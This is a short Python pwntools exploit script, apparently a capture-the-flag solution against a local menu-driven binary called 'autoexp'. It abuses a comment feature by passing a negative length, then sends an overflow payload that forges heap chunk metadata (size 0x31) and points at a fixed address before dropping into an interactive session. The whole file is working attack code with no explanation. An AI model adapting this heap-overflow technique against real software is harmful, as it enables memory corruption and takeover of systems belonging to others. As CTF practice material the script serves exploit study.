#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-03-28 05:55:53
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/

from pwn import *
context(log_level="debug")
DEBUG = 1

if DEBUG:
	p = process("./autoexp")
	# gdb.attach(p,"b*0x4018E2\nc")
else:
	p = remote('127.0.0.1',5000)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	p.recvuntil(data)

def add(name ,a1,a2):
	ru("Option: \n")
	sl("1")
	ru("unction name:\n")
	sl(name)
	ru("enter to end:\n")
	sl(a1)
	sl("")
	ru("e enter to end:\n")
	sl(a2)
	sl("")
def comment(length,data):
	ru("Option: \n")
	sl("3")
	ru("\n")
	sl("1")
	ru("Option:\n")
	sl("9")
	ru("omment\n")
	sl(length)
	sl(data)
add("a","a","a")
comment(str(0x18-2),"data")
add("a","a","a")
comment(str(-1),"a"*0x18+p64(0x31)+p64(0x603238))
p.interactive()
